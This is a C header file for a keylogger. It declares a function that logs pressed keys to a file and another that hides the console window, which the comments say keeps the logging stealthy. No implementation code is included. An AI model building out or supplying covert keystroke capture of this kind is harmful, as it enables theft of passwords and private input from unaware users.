/**
 * @file keylogger.h
 * @brief Header file for a basic keylogger implementation.
 */

#pragma once

 /**
  * @brief Log pressed keys to a file.
  *
  * Captures and logs pressed keys to a specified file.
  *
  * @param outFileName The name of the output file to log keys.
  * @return An error code indicating the success or failure of the operation.
  */
errno_t logKeys(const char* outFileName);

/**
 * @brief Hide the console window.
 *
 * This function hides the console window to prevent its visibility during
 * the keylogging process. This can help maintain stealthiness.
 */
void hideConsoleWindow(void);
